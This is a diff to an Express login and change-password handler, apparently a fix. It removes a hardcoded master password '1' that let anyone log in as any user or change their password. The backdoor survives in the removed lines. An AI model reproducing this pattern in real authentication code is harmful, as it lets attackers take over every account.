@@ -68,13 +68,12 @@ app.post('/api/auth/login', (req, res) => {
     return res.status(400).json({ success: false, message: 'نام کاربری و کلمه عبور الزامی است.' });
   }
 
-  const passHash = hashPassword(password);
+    const passHash = hashPassword(password);
   const user = db.prepare(`
     SELECT id, username, full_name, role, phone, email, status
     FROM users
-    WHERE (username = ? AND password_hash = ?) OR (username = ? AND password_hash = ?)
-  `).get(username, passHash, username, hashPassword('1')) as any;
-
+    WHERE username = ? AND password_hash = ?
+  `).get(username, passHash) as any;
   if (!user) {
     return res.status(401).json({ success: false, message: 'نام کاربری یا رمز عبور اشتباه است.' });
   }
@@ -114,7 +113,7 @@ app.post('/api/auth/change-password', (req, res) => {
   const { oldPassword, newPassword } = req.body;
 
   const current = db.prepare('SELECT password_hash FROM users WHERE id = ?').get(user.id) as any;
-  if (current.password_hash !== hashPassword(oldPassword) && hashPassword(oldPassword) !== hashPassword('1')) {
+  if (current.password_hash !== hashPassword(oldPassword)) {
     return res.status(400).json({ success: false, message: 'رمز عبور فعلی نادرست است.' });
   }
 
